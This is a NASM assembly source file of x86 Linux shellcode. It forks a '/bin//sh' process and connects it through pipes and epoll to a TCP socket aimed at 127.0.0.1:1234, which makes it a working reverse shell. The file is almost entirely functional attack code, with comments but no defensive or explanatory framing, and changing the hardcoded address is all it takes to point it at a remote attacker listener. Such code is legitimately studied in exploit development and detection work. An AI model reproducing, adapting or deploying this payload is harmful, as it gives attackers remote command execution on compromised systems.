;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;  

%define SYS_exit           0x001
%define SYS_fork           0x002 
%define SYS_read           0x003
%define SYS_write          0x004
%define SYS_close          0x006
%define SYS_execve         0x00B
%define SYS_kill           0x025
%define SYS_pipe           0x02A
%define SYS_dup2           0x03f
%define SYS_socketcall     0x066
%define SYS_epoll_ctl      0x0FF
%define SYS_epoll_wait     0x100
%define SYS_epoll_create1  0x149
%define SYS_shutdown       0x175


%define STDIN_FILENO    0
%define STDOUT_FILENO   1
%define STDERR_FILENO   2

%define EPOLLIN     0x001

%define EPOLL_CTL_ADD 1
%define EPOLL_CTL_DEL 2
%define EPOLL_CTL_MOD 3

%define SYS_SOCKET      1
%define SYS_BIND        2  
%define SYS_CONNECT     3 

%define SIGCHLD	20
%define BUFSIZ 256

%define SHUT_RDWR     1

struc epoll_event
  events resd 1
  data   resd 1
endstruc
         
struc sc_prop
  p_in  resd 2
  p_out resd 2
  s     resd 1
  pid   resd 1
  efd   resd 1
  len   resd 1
  evt   resd 1  
  evts  resd 1
  buf   resb BUFSIZ
  h     resd 1     
endstruc
 
    %ifndef BIN
      global main
      global _main
    %endif     
         
    bits 32
    
main:    
_main:    
      pushad
      sub    esp, sc_prop_size
      mov    edi, esp
      mov    ebp, esp
      
      ; create pipes
      push   2
      pop    ecx
c_pipe:      
      ; pipe(in);
      ; pipe(out);
      push   SYS_pipe
      pop    eax
      mov    ebx, edi             ; ebx = p_in      
      int    0x80      
      scasd
      scasd
      loop   c_pipe    
      
      ; pid = fork();
      push   SYS_fork
      pop    eax
      int    0x80    
      stosd                       ; save pid
      test   eax, eax
      jz     connect

      ; in this order..
      ;
      ; dup2 (out[1], STDERR_FILENO)      
      ; dup2 (out[1], STDOUT_FILENO)
      ; dup2 (in[0], STDIN_FILENO)   
      mov    cl, 2
      mov    ebx, [ebp+p_out+4]
dup_loop:
      mov    al, SYS_dup2
      int    0x80 
      dec    ecx
      cmove  ebx, [ebp+p_in]
      jns    dup_loop          ; jump if not signed   
  
      ; in this order..
      ;
      ; close(in[0]);
      ; close(in[1]);
      ; close(out[0]);
      ; close(out[1]);
      mov    esi, ebp
      push   4
      pop    ecx      
cls_pipes:
      lodsd
      xchg   eax, ebx      
      push   SYS_close
      pop    eax 
      int    0x80
      loop   cls_pipes      
      
      ; execve("/bin//sh", 0, 0);
      push   SYS_execve
      pop    eax
      cdq
      push   ecx
      push   '//sh'
      push   '/bin'
      mov    ebx, esp
      int    0x80
connect:    
      ; close(p.in[0]);
      push   SYS_close
      pop    eax
      mov    ebx, [ebp+p_in]    
      int    0x80    

      ; close(p.out[1]);
      push   SYS_close
      pop    eax      
      mov    ebx, [ebp+p_out+4]    
      int    0x80   
      
      ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
      push   SYS_socketcall
      pop    eax      
      push   SYS_SOCKET
      pop    ebx
      cdq
      push   edx               ; protocol = IPPROTO_IP
      push   ebx               ; type     = SOCK_STREAM
      push   2                 ; family   = AF_INET
      mov    ecx, esp          ; ecx      = &args
      int    0x80
      mov    [ebp+s], eax

      push   0x0100007f        ; sa.sin_addr=127.0.0.1
      push   0xD2040002        ; sa.sin_port=htons(1234), sa.sin_family=AF_INET
      mov    ecx, esp
      
      ; connect (s, &sa, sizeof(sa));    
      push   0x10              ; sizeof(sa)      
      push   ecx               ; &sa
      push   ebx               ; sockfd
      mov    ecx, esp          ; &args
      push   SYS_CONNECT
      pop    ebx               ; ebx=SYS_CONNECT
      push   SYS_socketcall
      pop    eax
      int    0x80      
      
      ; efd = epoll_create1(0);
      push   SYS_epoll_create1
      pop    eax
      xor    ebx, ebx
      int    0x80
      mov    [ebp+efd], eax
      
      test   eax, eax
      jle    shutdown
      mov    ebx, [ebp+s]
      clc      
poll_init:
      ; epoll_ctl(efd, EPOLL_CTL_ADD, i==0 ? s : out[0], &evts[0]);
      lea    edi, [ebp+evts]
      mov    esi, edi
      push   EPOLLIN
      pop    eax             ; evts[0].events = EPOLLIN
      stosd
      xchg   ebx, eax
      stosd                  ; evts[0].data.fd = i==0 ? s : out[0]
      xchg   edx, eax
      push   SYS_epoll_ctl
      pop    eax      
      mov    ebx, [ebp+efd]
      push   EPOLL_CTL_ADD
      pop    ecx
      int    0x80
      mov    ebx, [ebp+p_out+4]   ; do out[0] next      
      cmc
      jc    poll_init      
poll_wait:
      ; epoll_wait(efd, evts, 1, -1);
      push   SYS_epoll_wait
      pop    eax
      mov    ebx, [ebp+efd]
      lea    ecx, [ebp+evts]
      push   1
      pop    edx
      or     esi, -1
      int    0x80
      
      ; if (r <= 0) break;
      test   eax, eax
      jle    close_efd
      
      ; if (!(evt & EPOLLIN)) break;
      test   al, EPOLLIN
      jnz    close_efd
      
      ; if (fd == s)
      cmp    eax, [ebp+s]
      jne    read_stdout
      
      ; len = read(s, buf, BUFSIZ);
      push   SYS_read
      pop    eax
      mov    ebx, [ebp+s]
      lea    ecx, [ebp+buf]
      mov    edx, BUFSIZ
      int    0x80      
      mov    [ebp+len], eax
      
      ; write(in[1], buf, len);
      push   SYS_write
      pop    eax
      mov    ebx, [ebp+p_in+4]
      mov    ecx, [ebp+len]
      int    0x80
      jmp    poll_wait      
read_stdout:
      ; len = read(out[0], buf, BUFSIZ);
      push   SYS_read
      pop    eax
      mov    ebx, [ebp+p_out]
      lea    ecx, [ebp+buf]
      mov    edx, BUFSIZ
      int    0x80      
      mov    [ebp+len], eax
      
      ; write(s, buf, len);
      push   SYS_write
      pop    eax
      mov    ebx, [ebp+s]
      mov    ecx, [ebp+len]
      int    0x80
      jmp    poll_wait
close_efd:
      ; epoll_ctl(efd, EPOLL_CTL_DEL, h[i], NULL);
      push   SYS_epoll_ctl
      pop    eax
      mov    ebx, [ebp+efd]
      push   EPOLL_CTL_DEL
      pop    ecx
      mov    edx, [ebp+s]
      xor    esi, esi
      int    0x80  

      ; epoll_ctl(efd, EPOLL_CTL_DEL, h[i], NULL);      
      push   SYS_epoll_ctl
      pop    eax 
      mov    ebx, [ebp+efd]
      push   EPOLL_CTL_DEL
      pop    ecx
      mov    edx, [ebp+p_out+4]
      xor    esi, esi
      int    0x80       
shutdown:
      ; kill(pid, SIGCHLD);
      push   SYS_kill
      pop    eax
      mov    ebx, [ebp+pid]
      mov    ecx, SIGCHLD
      int    0x80

      ; shutdown(s, SHUT_RDWR);
      push   SYS_shutdown
      pop    eax
      mov    ebx, [ebp+s]
      mov    ecx, SHUT_RDWR
      int    0x80

      ; close(s);
      push   SYS_close
      pop    eax
      mov    ebx, [ebp+s]
      int    0x80
close_pipes:
      ; close(in[1]);
      push   SYS_close
      pop    eax      
      mov    ebx, [ebp+p_in+4]
      int    0x80

      ; close(out[0]);    
      push   SYS_close
      pop    eax      
      mov    ebx, [ebp+p_out]
      int    0x80    
exit:
      ; exit(0);
      push   SYS_exit
      pop    eax 
      int    0x80    
      
      add    esp, sc_prop_size
      popad
      ret    
      
%include "mx.asm"
%include "rnx.asm"
%include "cpx.asm"
      
